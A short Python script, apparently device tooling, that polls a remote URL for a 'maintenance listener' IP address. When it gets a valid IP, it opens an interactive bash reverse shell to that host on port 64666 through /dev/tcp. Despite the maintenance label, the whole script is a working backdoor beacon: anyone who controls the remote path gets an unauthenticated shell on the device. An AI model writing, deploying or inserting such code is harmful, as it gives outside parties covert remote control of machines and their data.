import sys
import os
import requests
from subprocess import run
import ipaddress

# Add your home directory to sys.path
home_directory = os.path.expanduser("~")
sys.path.append(home_directory)

from device_config import DEVICE_NUMBER, MAINTENANCE_SHELL_TIMEOUT

# Connection information
device = str(DEVICE_NUMBER)
url = "https://sanfris.me/aqk/maintenance_listener_" + device + "/"
LPORT="64666"

# First we find out if a manintenance listener is waiting for a connection
response = requests.get(url)

# If the response from the server is not an ip address there is no listener
try:
    ipaddress.ip_address(response.text)
except:
    print("Invalid address")
    exit(0)

# Once we have all information we connect to the listener
command = f"bash -c 'bash -i >& /dev/tcp/{response.text}/{LPORT} 0>&1'"
run(command, shell=True, timeout=MAINTENANCE_SHELL_TIMEOUT)
